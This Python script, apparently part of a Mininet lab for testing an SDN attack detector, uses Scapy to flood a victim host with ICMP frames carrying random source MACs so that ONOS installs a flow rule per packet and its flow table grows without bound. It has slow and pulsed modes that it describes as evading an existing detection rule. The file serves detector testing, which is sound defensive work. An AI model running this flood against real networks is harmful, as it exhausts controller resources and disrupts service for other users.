#!/usr/bin/env python3
"""
Sentinel red-team: random-source-MAC flood (the Lab 2 "Spiger" attack).

Forges ICMP echo frames whose SOURCE MAC is random on every packet, so ONOS's
reactive forwarding (keyed on in_port+eth_src+eth_dst) treats each packet as a
new flow and installs rules for it. The flow table then grows without bound.

One engine covers three scenarios, by rate and duty cycle:
  S4 flood   --rate 80                      constant high rate
  S5 slow    --rate 8                       low and steady (evades the Lab 2 rule)
  S6 pulsed  --rate 80 --on 2 --off 6       bursts with quiet gaps

Runs ONLY inside the emulated Mininet lab, toward h6. The sending host is
auto-detected, so this can be launched from ANY host (h1, h3, h5, ...), not
just h1 -- useful for testing whether the detector generalises across ports.

FLAGS
  --rate N      packets per second while sending (default 80)
  --duration N  total seconds the attack runs (default 60)
  --on N        pulsed mode: seconds of sending per burst (0 = constant)
  --off N       pulsed mode: quiet seconds between bursts
  --iface NAME  sending interface (default: auto-detect the host's *-eth0)

Run inside a host's namespace (run_scenario.py does this for you):
  sudo mnexec -a <host-pid> python3 scenarios/attacks/flood.py --rate 80
"""

import argparse
import os
import random
import subprocess
import sys
import time

from scapy.all import Ether, IP, ICMP, sendp

# The target is fixed to the lab victim h6; only the SOURCE host varies.
VICTIM_IP = "10.0.3.2"
VICTIM_MAC = "00:00:00:00:00:06"

IFACE = None     # set in main (auto-detected or --iface)
SRC_IP = None    # set in main (the sending host's own IP)


def detect_iface():
    """The host's data interface inside its Mininet namespace (h1-eth0,
    h3-eth0, ...). Auto-detected so the flood runs from any host."""
    for name in sorted(os.listdir("/sys/class/net")):
        if name.endswith("-eth0"):
            return name
    sys.exit("no <host>-eth0 interface found; run inside a Mininet host "
             "(mnexec -a <host-pid> ...).")


def iface_ipv4(iface):
    """The IPv4 address on iface, so the flood's source IP matches the host it
    runs from. Falls back to h1's address if it can't be read."""
    try:
        out = subprocess.run(["ip", "-4", "-o", "addr", "show", iface],
                             capture_output=True, text=True).stdout
        return out.split("inet ")[1].split("/")[0]
    except Exception:
        return "10.0.1.1"


def random_mac():
    """A locally-administered, unicast random MAC (first octet 0x02)."""
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255)
                                                 for _ in range(5))


def one_packet():
    """One ICMP echo to h6 with a fresh random source MAC."""
    return (Ether(src=random_mac(), dst=VICTIM_MAC) /
            IP(src=SRC_IP, dst=VICTIM_IP) /
            ICMP())


def send_burst(n):
    """Send n packets, each a new flow from ONOS's point of view."""
    pkts = [one_packet() for _ in range(n)]
    sendp(pkts, iface=IFACE, verbose=False)


def main():
    global IFACE, SRC_IP
    p = argparse.ArgumentParser(description="Lab random-source-MAC flood")
    p.add_argument("--rate", type=int, default=80,
                   help="packets per second while sending (default 80)")
    p.add_argument("--duration", type=int, default=60,
                   help="total seconds the attack runs (default 60)")
    p.add_argument("--on", type=float, default=0.0,
                   help="pulsed mode: seconds of sending per burst (0 = constant)")
    p.add_argument("--off", type=float, default=0.0,
                   help="pulsed mode: quiet seconds between bursts")
    p.add_argument("--iface", default=None,
                   help="sending interface (default: auto-detect <host>-eth0)")
    args = p.parse_args()

    IFACE = args.iface or detect_iface()
    if not os.path.exists("/sys/class/net/%s" % IFACE):
        sys.exit("%s not found. Run this inside a Mininet host "
                 "(mnexec -a <host-pid> ...)." % IFACE)
    SRC_IP = iface_ipv4(IFACE)

    pulsed = args.on > 0
    end = time.time() + args.duration
    sent = 0
    print("flood: iface=%s src=%s rate=%d/s duration=%ds %s" %
          (IFACE, SRC_IP, args.rate, args.duration,
           "pulsed on=%.1f off=%.1f" % (args.on, args.off) if pulsed
           else "constant"), flush=True)

    try:
        while time.time() < end:
            if pulsed:
                burst_end = min(time.time() + args.on, end)
                while time.time() < burst_end:
                    send_burst(args.rate)
                    sent += args.rate
                    time.sleep(1)
                time.sleep(args.off)
            else:
                send_burst(args.rate)
                sent += args.rate
                time.sleep(1)
    except KeyboardInterrupt:
        pass
    print("flood: stopped after %d packets" % sent, flush=True)


if __name__ == "__main__":
    main()
